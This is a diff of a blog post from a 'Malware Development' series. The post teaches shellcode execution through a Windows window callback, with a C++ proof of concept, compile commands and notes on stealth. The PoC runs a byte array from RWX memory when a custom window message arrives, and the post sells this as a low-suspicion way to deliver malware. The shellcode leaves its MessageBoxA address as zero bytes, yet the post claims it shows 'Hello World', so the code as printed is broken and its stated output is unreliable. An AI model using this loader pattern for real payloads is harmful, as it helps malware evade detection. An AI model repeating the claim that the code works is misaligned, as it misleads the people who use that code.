@@ -1,84 +1,86 @@
-# Shellcode Injection via Window Callbacks
+# Malware Development Part 14: Shellcode Injection via Window Callbacks-
+
+Shellcode injection is a potent technique in security research and exploit development, enabling the execution of arbitrary machine code within a target process. This post focuses on **shellcode injection via window callbacks**, a method that leverages the Windows messaging system to execute shellcode through the `WndProc` function.
+
 ---
 
-## Introduction
+## Introduction to Shellcode Injection
 
-Shellcode injection is a powerful tactic in exploit development and security research, allowing arbitrary code to run within another process. One lesser-known but effective method leverages **window callbacks** in the Windows GUI messaging system to execute shellcode via a custom window procedure (WndProc).
+**Shellcode** is a small, position-independent sequence of machine instructions that performs specific tasks such as spawning shells, displaying messages, or establishing connections. It is a fundamental element in many exploits.
 
-This post provides a detailed overview of this approach, including theory, a fresh proof-of-concept (POC) in C++ (different from previous samples), implementation details, and a security discussion. Whether you're a beginner or expert, this walkthrough aims to bridge theory and practice.
+Shellcode injection typically involves:
 
-## Table of Contents
+1. Injecting shellcode into the memory of a process.
+2. Redirecting code execution to the shellcode’s location.
 
-- [Introduction](#introduction)
-- [Understanding Window Callbacks](#understanding-window-callbacks)
-- [Shellcode Injection via Window Callbacks](#shellcode-injection-via-window-callbacks)
-- [Proof-of-Concept (POC) Code](#proof-of-concept-poc-code)
-- [Compiling on Kali Linux for Windows](#compiling-on-kali-linux-for-windows)
-- [How It Works](#how-it-works)
-- [Security Considerations](#security-considerations)
-- [Conclusion](#conclusion)
+Common techniques include thread injection, function pointer manipulation, and callback exploitation. This article focuses on **window callbacks**, a technique rooted in the Windows GUI subsystem.
+
+---
 
 ## Understanding Window Callbacks
 
 ### What is a Callback?
 
-A callback is a function the system calls in response to an event. In Windows applications, callbacks form the backbone of event-driven programming, especially in handling user input and system messages.
+A **callback** is a function registered to handle specific events or actions. In Windows programming, callbacks manage GUI events, such as mouse clicks or key presses.
 
-### Window Procedure (WndProc)
+### Window Procedure (`WndProc`)
 
-A **window procedure** is a callback that processes messages (like keystrokes or mouse clicks) for a specific window. Its typical signature:
+The `WndProc` is a user-defined function for handling messages sent to a window:
 
 ```cpp
 LRESULT CALLBACK WndProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam);
 ```
 
+Parameters:
 - `hwnd`: Handle to the window.
-- `msg`: The message identifier.
-- `wParam`, `lParam`: Message-specific data.
+- `msg`: Message identifier.
+- `wParam`, `lParam`: Additional message information.
 
-Windows uses a message queue to store messages per thread, which a **message loop** retrieves and dispatches to the corresponding WndProc.
+### Windows Messaging System
 
-This predictable mechanism makes WndProc a prime candidate for triggering injected shellcode.
+Windows uses a **message queue** for GUI threads, which is processed in a loop using `GetMessage` and `DispatchMessage`. The system calls `WndProc` when dispatching messages, making it a suitable target for injection.
+
+---
 
 ## Shellcode Injection via Window Callbacks
 
 ### Concept
 
-This method involves:
+This technique involves:
+1. Creating a window with a custom `WndProc`.
+2. Allocating executable memory for shellcode.
+3. Copying the shellcode into memory.
+4. Modifying `WndProc` to run shellcode on a specific message.
+5. Triggering the message to execute the code.
 
-1. Registering a window class and creating a window with a custom WndProc.
-2. Allocating executable memory using `VirtualAlloc`.
-3. Writing shellcode into that memory.
-4. Triggering WndProc with a custom message to execute the shellcode.
-5. Cleaning up memory afterward.
+### Why Use Window Callbacks?
 
-Why this method?
+- **Reliability**: The OS ensures `WndProc` is invoked for relevant messages.
+- **Legitimacy**: GUI callbacks are typical and less suspicious.
+- **Simplicity**: Easy to implement and control.
 
-- **Reliable**: WndProc is guaranteed to be called by Windows for messages.
-- **Controlled**: You control message dispatch timing.
-- **Low suspicion**: Uses standard GUI event flows.
-- **Simple**: No need for remote thread injection or IAT hooking.
+---
 
 ## Proof-of-Concept (POC) Code
 
-Here's a new C++ POC demonstrating shellcode injection via a window callback. This displays a MessageBox and cleans up after execution.
+This C++ code uses a basic 64-bit shellcode that shows a MessageBox. It includes memory allocation, execution, and cleanup.
 
 ```cpp
 #include <windows.h>
 
-// Minimal 64-bit shellcode to show MessageBox
+// Simple shellcode to display a MessageBox (64-bit)
 unsigned char shellcode[] = {
-    0x48, 0x83, 0xEC, 0x28, // sub rsp, 0x28
-    0x48, 0x31, 0xC9,       // xor rcx, rcx
-    0x48, 0x8D, 0x15, 0x1E, 0x00, 0x00, 0x00, // lea rdx, [rel msg]
-    0x4C, 0x8D, 0x05, 0x1F, 0x00, 0x00, 0x00, // lea r8, [rel title]
-    0x48, 0x31, 0xC9,       // xor rcx, rcx
-    0x48, 0xB8, 0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00, // mov rax, MessageBoxA address placeholder
-    0xFF, 0xD0,             // call rax
-    0x48, 0x83, 0xC4, 0x28, // add rsp, 0x28
-    0xC3,                   // ret
-    0x48, 0x65, 0x6C, 0x6C, 0x6F, 0x20, 0x57, 0x6F, 0x72, 0x6C, 0x64, 0x00, // "Hello World\0"
-    0x54, 0x65, 0x73, 0x74, 0x00 // "Test\0"
+    0x48, 0x83, 0xEC, 0x28,
+    0x48, 0x31, 0xC9,
+    0x48, 0x8D, 0x15, 0x1E, 0x00, 0x00, 0x00,
+    0x4C, 0x8D, 0x05, 0x1F, 0x00, 0x00, 0x00,
+    0x48, 0x31, 0xC9,
+    0x48, 0xB8, /* MessageBoxA address placeholder */ 0,0,0,0,0,0,0,0,
+    0xFF, 0xD0,
+    0x48, 0x83, 0xC4, 0x28,
+    0xC3,
+    'H','e','l','l','o',' ','W','o','r','l','d',0,
+    'T','e','s','t',0
 };
 
 LRESULT CALLBACK WndProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam) {
@@ -86,7 +88,7 @@ LRESULT CALLBACK WndProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam) {
     if (msg == WM_USER + 100) {
         shellcodeAddr = VirtualAlloc(NULL, sizeof(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
         if (!shellcodeAddr) {
-            MessageBoxW(hwnd, L"Memory allocation failed", L"Error", MB_OK | MB_ICONERROR);
+            MessageBoxW(hwnd, L"Failed to allocate memory", L"Error", MB_OK | MB_ICONERROR);
             return 0;
         }
         memcpy(shellcodeAddr, shellcode, sizeof(shellcode));
@@ -103,21 +105,21 @@ LRESULT CALLBACK WndProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam) {
 }
 
 int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
-    WNDCLASSW wc = {0};
+    WNDCLASSW wc = { 0 };
     wc.lpfnWndProc = WndProc;
     wc.hInstance = hInstance;
     wc.lpszClassName = L"InjectWindow";
 
     if (!RegisterClassW(&wc)) {
-        MessageBoxW(NULL, L"Window class registration failed", L"Error", MB_OK | MB_ICONERROR);
+        MessageBoxW(NULL, L"Failed to register window class", L"Error", MB_OK | MB_ICONERROR);
         return 1;
     }
 
-    HWND hwnd = CreateWindowExW(0, L"InjectWindow", L"Shellcode Demo",
-        WS_OVERLAPPEDWINDOW, CW_USEDEFAULT, CW_USEDEFAULT, 400, 300, NULL, NULL, hInstance, NULL);
+    HWND hwnd = CreateWindowExW(0, L"InjectWindow", L"Shellcode Demo", WS_OVERLAPPEDWINDOW,
+        CW_USEDEFAULT, CW_USEDEFAULT, 400, 300, NULL, NULL, hInstance, NULL);
 
     if (!hwnd) {
-        MessageBoxW(NULL, L"Window creation failed", L"Error", MB_OK | MB_ICONERROR);
+        MessageBoxW(NULL, L"Failed to create window", L"Error", MB_OK | MB_ICONERROR);
         return 1;
     }
 
@@ -126,7 +128,7 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine
 
     SendMessageW(hwnd, WM_USER + 100, 0, 0);
 
-    MSG msg = {0};
+    MSG msg = { 0 };
     while (GetMessageW(&msg, NULL, 0, 0)) {
         TranslateMessage(&msg);
         DispatchMessageW(&msg);
@@ -136,43 +138,79 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine
 }
 ```
 
-## Compiling on Kali Linux for Windows
+---
 
-Use **MinGW-w64** for cross-compilation:
+## Compiling Shellcode on Kali Linux
+
+To compile the above code for Windows on Kali Linux:
+
+### Prerequisites
 
 ```bash
-sudo apt update && sudo apt install mingw-w64
+sudo apt update
+sudo apt install mingw-w64
+```
+
+### Compilation
+
+```bash
 x86_64-w64-mingw32-g++ -static -static-libgcc -static-libstdc++ -DUNICODE -D_UNICODE -mwindows shellcode_injection.cpp -o shellcode_injection.exe
 ```
 
-Key flags:
+Explanation:
+- `-static`: Statically links libraries.
+- `-DUNICODE`: Enables Unicode support.
+- `-mwindows`: GUI subsystem (no console).
+- `shellcode_injection.cpp`: Your source file.
 
-- `-static`: Avoids dynamic dependencies.
-- `-mwindows`: Links GUI subsystem.
-- `-DUNICODE`: Enables Unicode APIs.
+Transfer the `.exe` to a 64-bit Windows environment and execute.
 
-Then transfer `shellcode_injection.exe` to a Windows machine for testing.
+> Note : Ensure the shellcode is 64-bit (as provided) for compatibility.
+> Test in a Windows VM, as Kali cannot run the .exe natively.
+> Use -g for debugging symbols if needed: -g -fdiagnostics-color=always.
+
+---
+
+## POC(Test in VS Code)
+![image](https://github.com/user-attachments/assets/87adf252-6d12-4c16-89e4-dc3cb761faaa)
+
 
 ## How It Works
 
-1. **Registers a window class** and creates a window.
-2. Shows the window.
-3. Sends custom message `WM_USER + 100` to trigger WndProc.
-4. WndProc allocates executable memory and copies shellcode.
-5. Shellcode runs (displays MessageBox).
-6. Memory is freed.
-7. The window remains open until closed.
+1. **Initialization**: Registers a window class and creates a window.
+2. **Display**: Shows a window titled “Shellcode Demo”.
+3. **Trigger**: Sends a message (`WM_USER + 100`) to execute shellcode.
+4. **Execution**:
+   - Allocates executable memory.
+   - Copies shellcode.
+   - Executes it.
+   - Frees the memory.
+5. **Loop**: Processes messages.
+6. **Output**: MessageBox with "Hello World" and title "Test".
 
-## Security Considerations
+---
 
-- **Stealth**: Works via normal Windows messaging.
-- **Controlled**: Execution can be triggered predictably.
-- **Abuse potential**: Can be used for malware delivery.
-- Always test responsibly in isolated environments.
+## Security Implications
+
+### Malicious Use
+
+- **Malware**: Can be adapted to run spyware or other payloads.
+- **Exploitation**: Effective in GUI-based processes.
+- **Red Teaming**: Demonstrates post-exploitation techniques.
+
+### Why Effective?
+
+- **Stealthy**: Mimics GUI message handling.
+- **Controlled**: Triggered by specific messages.
+- **Simple**: Requires minimal code.
+
+---
 
 ## Conclusion
 
-Shellcode injection using window callbacks is a fascinating and practical method for executing arbitrary code in a Windows process. This POC demonstrates a clean, stable implementation leveraging the Windows GUI messaging system for execution flow control. A valuable technique for both defenders and red teamers exploring Windows internals.
+Shellcode injection via window callbacks is a reliable and stealthy method for arbitrary code execution in Windows environments. The POC offers a practical introduction to shellcode behavior, memory management, and Windows internals. Always use responsibly in controlled labs or for red teaming.
 
-Thanks for reading!
+Thank you for reading!
+
 — **Malforge Group**
+
